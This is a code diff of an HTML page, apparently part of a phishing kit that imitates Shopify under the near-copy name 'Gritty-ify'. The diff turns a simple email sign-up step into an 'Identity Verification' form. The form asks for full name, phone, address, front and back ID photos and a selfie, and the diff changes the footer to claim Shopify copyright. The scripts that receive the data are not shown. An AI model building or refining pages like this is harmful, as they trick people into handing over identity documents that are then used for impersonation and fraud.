@@ -3,8 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Sell your books faster with Gritty-ify. Get started in a minute.">
-    <title>Get started — Gritty-ify</title>
+    <meta name="description" content="Verify your identity — Gritty-ify.">
+    <title>Identity Verification — Gritty-ify</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
@@ -14,7 +14,7 @@
 </head>
 <body>
     <header class="topbar">
-      <a class="brand" href="./index.html">
+        <a class="brand" href="./index.html">
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 142.8" height="36" style="vertical-align: middle; background: transparent; border-radius: 0; padding: 0;">
     <g>
       <g>
@@ -40,55 +40,73 @@
     </header>
 
     <main class="wrap">
-        <section class="card" role="region" aria-labelledby="s1-title">
-            <h1 id="s1-title">Sell your book</h1>
-            <p class="subtitle">Add your email.</p>
+        <section class="card" role="region" aria-labelledby="s2-title">
+            <h1 id="s2-title">Identity Verification</h1>
+            <p class="subtitle">Please provide your identification and visual proof to verify your account.</p>
 
-            <form id="step1-form" novalidate>
-                <label class="lbl" for="email">Email</label>
-                <input type="email" id="email" name="email" autocomplete="email" required>
-                <p class="error" id="email-error" role="alert"></p>
+            <form id="step2-form" novalidate>
+                <label class="lbl" for="fullname">Full name</label>
+                <input type="text" id="fullname" name="fullname" autocomplete="name" required>
+                <p class="error" id="name-error" role="alert"></p>
+
+                <label class="lbl" for="phone">Phone number</label>
+                <input type="tel" id="phone" name="phone" autocomplete="tel" required>
+                <p class="error" id="phone-error" role="alert"></p>
+
+                <label class="lbl" for="address">Address</label>
+                <input type="text" id="address" name="address" autocomplete="street-address" required>
+                <p class="error" id="address-error" role="alert"></p>
+
+                <label class="lbl">Identification Documents</label>
+                <div class="uploads">
+                    <label class="upload" id="front-drop">
+                        <input type="file" id="front" accept="image/*" hidden>
+                        <i class="fa-regular fa-address-card"></i>
+                        <span class="upload-text" id="front-text">ID Front (Photo)</span>
+                        <img class="thumb" id="front-thumb" alt="" hidden>
+                    </label>
+                    <label class="upload" id="back-drop">
+                        <input type="file" id="back" accept="image/*" hidden>
+                        <i class="fa-regular fa-address-card"></i>
+                        <span class="upload-text" id="back-text">ID Back (Photo)</span>
+                        <img class="thumb" id="back-thumb" alt="" hidden>
+                    </label>
+                </div>
+                <label class="lbl lbl-spaced" for="full">Full product photo</label>
+                <label class="upload upload-wide" id="full-drop">
+                    <input type="file" id="full" accept="image/*" hidden>
+                    <i class="fa-solid fa-camera"></i>
+                    <span class="upload-text" id="full-text">Verification Selfie</span>
+                    <img class="thumb" id="full-thumb" alt="" hidden>
+                </label>
+                <p class="hint">A photo of yourself.</p>
+                <p class="error" id="image-error" role="alert"></p>
 
                 <button type="submit" class="btn" id="submit-btn">
-                    <span class="btn-label">Continue with email</span>
+                    <span class="btn-label">Submit</span>
                     <span class="spinner" aria-hidden="true"></span>
                 </button>
             </form>
 
-            <p class="fineprint">
-               By continuing, you agree to the Terms and Privacy Policy, and to receive marketing emails from Shopify. Unsubscribe anytime
+            <p class="fineprint" id="fineprint-text">
+                We use these details and photos to review your store and contact you by email.
             </p>
+
+            <div class="success" id="success" hidden>
+                <i class="fa-solid fa-circle-check"></i>
+                <h2>Thank you!</h2>
+                <p>We'll send you an update within 24 hours by email.</p>
+            </div>
         </section>
 
         <footer class="legal">
-            <span>&copy; <span id="year"></span> Gritty-ify</span>
+            <span>&copy; <span id="year"></span> Shopify </span>
             <a href="#">Privacy</a>
             <a href="#">Terms</a>
         </footer>
     </main>
 
-    <script>
-        // Pre-fill email if returning from a later page
-        const params = new URLSearchParams(window.location.search);
-        const prefill = params.get('email');
-        if (prefill) document.getElementById('email').value = prefill;
-
-        // On submit → go to company.html with email
-        document.getElementById('step1-form').addEventListener('submit', (e) => {
-            e.preventDefault();
-            const emailInput = document.getElementById('email');
-            const emailError = document.getElementById('email-error');
-            const email = emailInput.value.trim();
-
-            if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
-                emailError.textContent = 'Please enter a valid email address.';
-                return;
-            }
-            emailError.textContent = '';
-            window.location.href = './login.html?email=' + encodeURIComponent(email);
-        });
-    </script>
-
     <script src="./ressources/js/meta.js"></script>
+    <script src="./ressources/js/step2.js"></script>
 </body>
 </html>
